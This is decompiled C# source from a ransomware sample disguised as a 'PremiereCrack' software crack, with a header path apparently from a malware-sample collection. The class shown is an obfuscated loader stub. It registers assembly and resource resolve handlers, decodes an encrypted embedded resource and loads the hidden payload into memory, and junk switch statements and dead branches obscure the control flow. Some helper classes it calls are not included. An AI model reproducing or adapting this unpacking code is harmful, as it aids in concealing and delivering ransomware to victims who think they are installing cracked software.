// Decompiled with JetBrains decompiler
// Type: A.P
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-0d2137d133179a2fbff7bf38a8125d4b74e9615aaa47b5f4a3056eccce7a8f6e.exe

using System;
using System.Reflection;

namespace A
{
  internal class P
  {
    private static readonly Assembly T;

    static P()
    {
      AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(P.E);
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(P.T);
      P.T = Assembly.Load(P.T(Assembly.GetExecutingAssembly()));
    }

    internal static void T()
    {
    }

    private static Assembly T(object T, ResolveEventArgs E)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string name = P.T(executingAssembly);
      if (!E.Name.StartsWith(name))
        return (Assembly) null;
label_1:
      switch (7)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (P.T);
          }
          return Assembly.Load(W.T(97L, executingAssembly.GetManifestResourceStream(name)));
      }
    }

    private static string T(Assembly T)
    {
      string T1 = T.FullName;
      int length = T1.IndexOf(',');
      if (length >= 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (P.T);
            }
            T1 = T1.Substring(0, length);
            break;
        }
      }
      return IH.T((object) T1, (object) '&');
    }

    private static Assembly E(object T, ResolveEventArgs E)
    {
      if ((object) P.T == null)
        return P.T;
label_1:
      switch (7)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (P.E);
          }
          string[] manifestResourceNames = P.T.GetManifestResourceNames();
          for (int index = 0; index < (int) N.T(manifestResourceNames); ++index)
          {
            if (RH.T(manifestResourceNames[index], E.Name))
            {
label_6:
              switch (1)
              {
                case 0:
                  goto label_6;
                default:
                  return P.T;
              }
            }
          }
label_10:
          switch (4)
          {
            case 0:
              goto label_10;
            default:
              return (Assembly) null;
          }
      }
    }
  }
}
